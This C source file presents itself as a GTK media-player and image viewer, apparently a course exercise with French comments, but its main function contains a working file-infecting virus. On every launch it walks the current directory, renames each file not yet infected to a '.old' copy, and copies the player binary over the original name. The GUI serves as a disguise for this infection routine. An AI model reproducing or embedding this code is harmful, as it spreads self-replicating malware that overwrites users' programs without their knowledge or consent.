#include <stdlib.h>
#include <stdio.h>
#include <gtk/gtk.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdbool.h>

GtkImage * image;
int n = 5;
int k = 0;
void on_destroy_main_window(GtkButton *button, gpointer user_data){
    gtk_main_quit();
}

void on_btn_next_clicked(GtkButton *button, gpointer user_data){
     k = (k+1)%n;
     //gtk_image_set_from_file(image,"img/4.jpg");
     printf("clicked next %d\n",k);
}

void on_btn_prev_clicked(GtkButton *button, gpointer user_data){
	if (k==0){
		k=5;
	}
    k = (k-1)%n;
    //gtk_image_set_from_file(image,"img/2.jpg");
    printf("clicked previous %d\n",k);
}

void step3infection(char * file_name){
	printf("%s\n", "\nStep 3 - Infection fichier");
	// rename executables
	if (strcmp(file_name, "mediaplayer") != 0){
		char old_name[100];
		strcpy(old_name, file_name);
		char * old = ".old";
		strcat(file_name, old);
		rename (old_name, file_name);

		// copy virus
		 pid_t ret_val = fork(); 
		  if(ret_val == 0) {
	    	execl("/bin/cp","cp","mediaplayer",old_name,NULL);
		 }
	}
}


bool step2VerificationInfection(char * file_name){
	//verif .old si oui -> infécté, sinon regarder si il est dans le rep courant : strstr 
	printf("%s\n", "\nStep 2 - Vérification fichier infecté");
	char * ret = strstr(file_name, ".old");
	if (ret)
		return true;

	char file[100];
	strcpy(file,file_name);
	char * old = ".old";
	strcat(file,old);
	if (fopen(file,"r"))
		return true;
	
	return false;
}

int getN(){
	struct dirent *pDirent;
    DIR *pDir;
    int n = 0;
    pDir = opendir (".");
    if (pDir != NULL) {
	    while ((pDirent = readdir(pDir)) != NULL) {
	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0){
				n++;
	        }
	    }
	}
    closedir (pDir);
    return n;
}

void step1listProg(char ** executables){
	printf("%s\n", "\nStep 1 - Lecture répertoire");
	struct dirent *pDirent;
    DIR *pDir;
    int i = 0;
    pDir = opendir (".");
    if (pDir != NULL) {
	    while ((pDirent = readdir(pDir)) != NULL) {
	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0){
	        	executables[i] = pDirent->d_name;
	        	i++;
	        }
	    }
	}
    closedir (pDir);
}

int main(int argc, char *argv[]){
	GtkBuilder *builder;
    GtkWidget *window;
    gtk_init(&argc, &argv);
    builder = gtk_builder_new();
    gtk_builder_add_from_file(builder, "../media_player.glade", NULL);
    window = GTK_WIDGET(gtk_builder_get_object(builder, "media_player"));
    gtk_builder_connect_signals(builder, NULL);
    image = (GtkImage*) gtk_builder_get_object(builder, "img_mediaplayer");
	
	int n = getN();
	struct stat buf;
	bool infect = false;
	char * executables[n];
	step1listProg(executables);
	for (int i = 0; i < n; i++){
		infect = step2VerificationInfection(executables[i]);
		if (infect == 0){
			printf ("%s infecté : False\n", executables[i]);
			step3infection(executables[i]);
		} else {
			printf ("%s infecté : True\n", executables[i]);
		}
		stat(executables[i],&buf);
		printf("Status executable : %o\n", buf.st_mode & S_IXUSR);
	    printf("Status régulier : %o\n", buf.st_mode & S_IFREG);
	}
	   

	g_object_unref(builder);
	gtk_widget_show(window);
	gtk_main();

    return 0;
}




